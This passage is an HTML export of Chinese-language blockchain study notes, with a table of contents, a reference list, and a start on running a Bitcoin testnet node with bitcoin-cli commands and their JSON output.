style="cursor: pointer;" href="#header-n757">交易脚本和脚本语言</a></span><span class="md-toc-item md-toc-h5" data-ref="n761"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n761">图灵非完备性</a></span><span class="md-toc-item md-toc-h5" data-ref="n764"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n764">去中心化验证</a></span><span class="md-toc-item md-toc-h5" data-ref="n767"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n767">脚本构建（锁定与解锁）</a></span><span class="md-toc-item md-toc-h5" data-ref="n776"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n776">脚本执行堆栈</a></span><span class="md-toc-item md-toc-h5" data-ref="n783"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n783">P2PKH（Pay-to-Public-Key-Hash）</a></span><span class="md-toc-item md-toc-h3" data-ref="n797"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n797">比特币网络</a></span><span class="md-toc-item md-toc-h4" data-ref="n798"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n798">p2p 网络架构</a></span><span class="md-toc-item md-toc-h4" data-ref="n799"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n799">节点类型及分工</a></span><span class="md-toc-item md-toc-h3" data-ref="n813"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n813">区块链</a></span><span class="md-toc-item md-toc-h4" data-ref="n814"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n814">区块结构</a></span><span class="md-toc-item md-toc-h4" data-ref="n838"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n838">区块头</a></span><span class="md-toc-item md-toc-h4" data-ref="n870"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n870">区块标识符</a></span><span class="md-toc-item md-toc-h4" data-ref="n884"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n884">创世区块</a></span><span class="md-toc-item md-toc-h4" data-ref="n889"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n889">区块的连接</a></span><span class="md-toc-item md-toc-h4" data-ref="n895"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n895">Merkle 树</a></span><span class="md-toc-item md-toc-h3" data-ref="n902"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n902">挖矿与共识</a></span><span class="md-toc-item md-toc-h2" data-ref="n903"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n903">维基链（智能合约）</a></span><span class="md-toc-item md-toc-h3" data-ref="n904"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n904">获取节点信息</a></span><span class="md-toc-item md-toc-h4" data-ref="n906"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n906">获取地址列表</a></span><span class="md-toc-item md-toc-h4" data-ref="n908"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n908">获取账户信息</a></span><span class="md-toc-item md-toc-h3" data-ref="n910"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n910">生成测试地址、充值、激活地址</a></span><span class="md-toc-item md-toc-h4" data-ref="n911"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n911">生成测试地址</a></span><span class="md-toc-item md-toc-h4" data-ref="n913"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n913">充值</a></span><span class="md-toc-item md-toc-h4" data-ref="n915"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n915">查询余额</a></span><span class="md-toc-item md-toc-h4" data-ref="n923"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n923">激活地址</a></span><span class="md-toc-item md-toc-h4" data-ref="n925"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n925">确认地址已激活</a></span><span class="md-toc-item md-toc-h3" data-ref="n932"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n932">注册应用脚本</a></span><span class="md-toc-item md-toc-h3" data-ref="n937"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n937">充值</a></span><span class="md-toc-item md-toc-h4" data-ref="n951"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n951">计算合约内容</a></span><span class="md-toc-item md-toc-h4" data-ref="n990"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n990">充值</a></span><span class="md-toc-item md-toc-h4" data-ref="n992"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n992">查询应用账户信息</a></span><span class="md-toc-item md-toc-h3" data-ref="n1003"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1003">提现</a></span><span class="md-toc-item md-toc-h4" data-ref="n1004"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1004">查看当前余额</a></span><span class="md-toc-item md-toc-h4" data-ref="n1006"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1006">提现</a></span><span class="md-toc-item md-toc-h4" data-ref="n1034"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1034">再次查看当前余额</a></span><span class="md-toc-item md-toc-h3" data-ref="n1041"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1041">图示余额变化</a></span><span class="md-toc-item md-toc-h3" data-ref="n1044"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1044">脚本出错处理</a></span><span class="md-toc-item md-toc-h2" data-ref="n1048"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1048">以太坊</a></span><span class="md-toc-item md-toc-h3" data-ref="n1051"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1051">智能合约</a></span><span class="md-toc-item md-toc-h4" data-ref="n1052"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1052">何为智能合约？</a></span><span class="md-toc-item md-toc-h4" data-ref="n1057"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1057">编程语言：Solidity</a></span><span class="md-toc-item md-toc-h4" data-ref="n1064"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1064">运行环境：EVM</a></span><span class="md-toc-item md-toc-h4" data-ref="n1067"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1067">合约的编译</a></span><span class="md-toc-item md-toc-h4" data-ref="n1070"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1070">合约的部署</a></span><span class="md-toc-item md-toc-h5" data-ref="n1073"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1073">geth</a></span><span class="md-toc-item md-toc-h5" data-ref="n1079"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1079">如何部署</a></span><span class="md-toc-item md-toc-h4" data-ref="n1105"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1105">运行</a></span><span class="md-toc-item md-toc-h3" data-ref="n1108"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1108">Gas</a></span><span class="md-toc-item md-toc-h3" data-ref="n1120"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1120">以太坊网络</a></span><span class="md-toc-item md-toc-h4" data-ref="n1406"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1406">使用以太坊正式网络</a></span><span class="md-toc-item md-toc-h4" data-ref="n1121"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1121">使用以太坊官网测试网络 Testnet</a></span><span class="md-toc-item md-toc-h4" data-ref="n1124"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1124">使用私有链</a></span><span class="md-toc-item md-toc-h4" data-ref="n1128"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1128">使用开发者网络（模式）</a></span><span class="md-toc-item md-toc-h4" data-ref="n1131"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1131">使用模拟环境</a></span><span class="md-toc-item md-toc-h2" data-ref="n1134"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1134">Hyperledger Fabric</a></span><span class="md-toc-item md-toc-h2" data-ref="n1143"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1143">区块链技术</a></span><span class="md-toc-item md-toc-h3" data-ref="n1144"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1144">定义</a></span><span class="md-toc-item md-toc-h3" data-ref="n1147"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1147">分类</a></span><span class="md-toc-item md-toc-h3" data-ref="n1158"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1158">商业价值</a></span><span class="md-toc-item md-toc-h3" data-ref="n1184"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1184">理论/技术点</a></span><span class="md-toc-item md-toc-h4" data-ref="n1185"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1185">图灵完全</a></span><span class="md-toc-item md-toc-h4" data-ref="n1188"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1188">base58</a></span><span class="md-toc-item md-toc-h3" data-ref="n1207"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1207">应用场景</a></span><span class="md-toc-item md-toc-h4" data-ref="n1259"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1259">存证业务</a></span><span class="md-toc-item md-toc-h4" data-ref="n1298"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1298">比特币数据记录</a></span><span class="md-toc-item md-toc-h4" data-ref="n1334"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1334">以太坊数据记录</a></span><span class="md-toc-item md-toc-h2" data-ref="n1339"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1339">以太坊 geth 源码</a></span><span class="md-toc-item md-toc-h3" data-ref="n1343"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1343">同步模式</a></span><span class="md-toc-item md-toc-h4" data-ref="n1344"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1344">同步模式的定义</a></span><span class="md-toc-item md-toc-h4" data-ref="n1368"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1368">默认同步模式</a></span><span class="md-toc-item md-toc-h4" data-ref="n1379"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1379">同步模式的自动切换</a></span><span class="md-toc-item md-toc-h4" data-ref="n1387"><a class="md-toc-inner" style="cursor: pointer;" href="#header-n1387">总结</a></span></p></div><hr /><blockquote><p><strong>参考资料：</strong></p><ul><li><a href='http://www.ehcoo.com/A%20Peer-to-Peer%20Electronic%20Cash%20System.html'>比特币白皮书中英文对照版</a></li><li><a href='http://book.8btc.com/books/1/master_bitcoin/_book/'>精通比特币</a></li><li><a href='http://book.8btc.com/books/6/masterbitcoin2cn/_book/'>精通比特币第二版</a></li><li><a href='https://github.com/ChristopherA/Learning-Bitcoin-from-the-Command-Line'>Learning-Bitcoin-from-the-Command-Line</a></li><li><a href='https://github.com/kallewoof/btcdeb'>调试 BTC 脚本</a></li><li><a href='https://github.com/coinspark/python-OP_RETURN'>python-OP_RETURN</a></li><li><a href='http://book.8btc.com/blockchain_guide'>区块链技术指南</a></li><li><a href='https://en.wikipedia.org/wiki/Blockchain'>区块链维基百科</a></li><li><a href='https://en.wikipedia.org/wiki/Turing_completeness'>图灵完备维基百科</a></li><li><a href='https://zhuanlan.zhihu.com/p/33462619'>基于区块链的存证业务构想</a></li><li><a href='https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%99%BD%E7%9A%AE%E4%B9%A6'>以太坊白皮书</a></li><li><a href='https://eips.ethereum.org/'>Ethereum Improvement Proposals (EIPs)</a></li><li><a href='https://souptacular.gitbooks.io/ethereum-tutorials-and-tips-by-hudson/content/private-chain.html'>以太坊搭建私链</a></li><li><a href='https://www.jianshu.com/p/f3f36447546e'>以太坊 Web3.js 开发基础</a></li><li><a href='http://web3.tryblockchain.org/index.html'>Web3.js API 中文文档</a></li><li><a href='https://github.com/cooleye/web3tutorial'>Web3 tutorial</a></li><li><a href='http://solidity-cn.readthedocs.io/zh/develop/index.html'>Solidity 中文开发文档</a></li><li><a href='http://solidity.readthedocs.io/en/v0.4.24/'>Solidity 英文开发文档</a></li><li><a href='https://github.com/ethereum/go-ethereum/wiki/Contract-Tutorial'>Contract tutorial</a></li><li><a href='https://ethgasstation.info/'>ETH Gas Station</a></li><li><a href='https://etherscan.io/tx/0xb1ed364e4333aae1da4a901d5231244ba6a35f9421d4607f7cb90d60bf45578a'>以太坊 - 疫苗之王</a></li><li><a href='https://digitalcommons.augustana.edu/cgi/viewcontent.cgi?article=1000&context=cscfaculty'>Data Insertion in Bitcoin&#39;s Blockchain</a></li></ul></blockquote><h2><a name='header-n73' class='md-header-anchor '></a>DIY</h2><h3><a name='header-n74' class='md-header-anchor '></a>比特币测试网络</h3><blockquote><p><strong>OS: </strong>Ubuntu 14.04.5 LTS</p><p><strong>Bitcoin Code Daemon:</strong> v0.16.99.0-7c32b41</p></blockquote><h4><a name='header-n80' class='md-header-anchor '></a>运行 bitcoind</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kevin@ubuntu:~<span class="cm-def">$ bitcoind</span> <span class="cm-attribute">-testnet</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 31px;"></div><div class="CodeMirror-gutters" style="display: none; height: 31px;"></div></div></div></pre><h4><a name='header-n82' class='md-header-anchor '></a>运行 bitcoin-cli</h4><blockquote><p><strong>API 接口：</strong><a href='https://en.bitcoin.it/wiki/Original_Bitcoin_client/API_calls_list' target='_blank' class='url'>https://en.bitcoin.it/wiki/Original_Bitcoin_client/API_calls_list</a></p></blockquote><ul><li>获取状态信息</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kevin@ubuntu:~<span class="cm-def">$ bitcoin</span><span class="cm-attribute">-cli</span> <span class="cm-attribute">-testnet</span> <span class="cm-attribute">-getinfo</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"version"</span>: <span class="cm-number">169900</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"protocolversion"</span>: <span class="cm-number">70015</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"walletversion"</span>: <span class="cm-number">169900</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"balance"</span>: <span class="cm-number">1</span>.65000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"blocks"</span>: <span class="cm-number">1325293</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"timeoffset"</span>: <span class="cm-number">3</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"connections"</span>: <span class="cm-number">5</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"proxy"</span>: <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"difficulty"</span>: <span class="cm-number">47237276</span>.6179756,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"testnet"</span>: <span class="cm-atom">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"keypoololdest"</span>: <span class="cm-number">1528804513</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"keypoolsize"</span>: <span class="cm-number">1000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"paytxfee"</span>: <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"relayfee"</span>: <span class="cm-number">0</span>.00001000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"warnings"</span>: <span class="cm-string">"This is a pre-release test build - use at your own risk - do not use for mining or merchant applications"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 445px;"></div><div class="CodeMirror-gutters" style="display: none; height: 445px;"></div></div></div></pre><ul><li>获取钱包信息</li></ul><blockquote><p>可通过 <a href='https://testnet.manu.backend.hamburg/faucet' target='_blank' class='url'>https://testnet.manu.backend.hamburg/faucet</a> 获取免费的测试币</p><p><img src='pic/blockchain/faucet.png' alt='' referrerPolicy='no-referrer' /></p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kevin@ubuntu:~<span class="cm-def">$ bitcoin</span><span class="cm-attribute">-cli</span> <span class="cm-attribute">-testnet</span> getwalletinfo</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"walletname"</span>: <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"walletversion"</span>: <span class="cm-number">169900</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"balance"</span>: <span class="cm-number">1</span>.65000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"unconfirmed_balance"</span>: <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"immature_balance"</span>: <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"txcount"</span>: <span class="cm-number">2</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"keypoololdest"</span>: <span class="cm-number">1528804513</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"keypoolsize"</span>: <span class="cm-number">1000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"keypoolsize_hd_internal"</span>: <span class="cm-number">1000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"paytxfee"</span>: <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"hdseedid"</span>: <span class="cm-string">"44f0e603435bf5f58481b24fd597e8bd9180c840"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">"hdmasterkeyid"</span>: <span class="cm-string">"44f0e603435bf5f58481b24fd597e8bd9180c840"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 353px;"></div><div class="CodeMirror-gutters" style="display: none; height: 353px;"></div></div></div></pre><ul><li>查询交易信息</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kevin@ubuntu:~<span class="cm-def">$ bitcoin</span><span class="cm-attribute">-cli</span> <span class="cm-attribute">-testnet</span> listtransactions</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"address"</span>: <span class="cm-string">"2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"category"</span>: <span class="cm-string">"receive"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"amount"</span>: <span class="cm-number">1</span>.10000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"label"</span>: <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"vout"</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"confirmations"</span>: <span class="cm-number">106</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"blockhash"</span>: <span class="cm-string">"0000000000003f000137e5a3c5c8664b559c598b4edf293dac821dcbd24ba905"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"blockindex"</span>: <span class="cm-number">39</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"blocktime"</span>: <span class="cm-number">1528857252</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"txid"</span>: <span class="cm-string">"93ee4409e3adb0954c799cf7705d3c09a8d619c3f1ef3808472b6a5d9cc93ccd"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"walletconflicts"</span>: [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"time"</span>: <span class="cm-number">1528854102</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"timereceived"</span>: <span class="cm-number">1528854102</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"bip125-replaceable"</span>: <span class="cm-string">"no"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"address"</span>: <span class="cm-string">"2N833q6qKVtqYQGeCkoxkhSqVBiLFfPNTvZ"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"category"</span>: <span class="cm-string">"receive"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"amount"</span>: <span class="cm-number">0</span>.55000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"label"</span>: <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"vout"</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"confirmations"</span>: <span class="cm-number">105</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"blockhash"</span>: <span class="cm-string">"000000000000002bf6b26f415d62c1c8a55b4463de8abb9ee1d467da86c77082"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"blockindex"</span>: <span 